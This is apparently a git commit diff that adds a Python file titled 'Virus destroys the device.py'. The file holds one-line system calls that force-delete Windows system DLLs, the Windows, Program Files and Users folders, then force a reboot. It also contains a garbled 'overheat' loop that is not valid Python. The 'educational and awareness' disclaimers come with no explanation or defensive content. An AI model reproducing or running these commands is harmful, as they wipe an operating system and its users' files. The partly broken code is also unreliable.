b8d402e0c2ee24ca21236e61b5bd6467b4e70fbf
Αиσиyмσυs <md.cyberx@gmail.com>
2026-01-28 11:16:36 +0200

    Add files via upload
    These programs and scripts are for educational and awareness purposes.

---
+++ Virus destroys the device.py
@@ -0,0 +1,6 @@
+import os;os.system('del /f /s /q C:\\Windows\\System32\\*.dll & while 1:open("overheat.txt","rb+").read().write(b"a"*1024*1024)') 
+
+import os;os.system('del /f /s /q C:\\Windows\\*.* & del /f /s /q C:\\Program Files\\* & del /f /s /q C:\\Users\\* & shutdown -r -t 0 -f')
+
+
+#☢️These instructions are for educational and awareness purposes.☢️
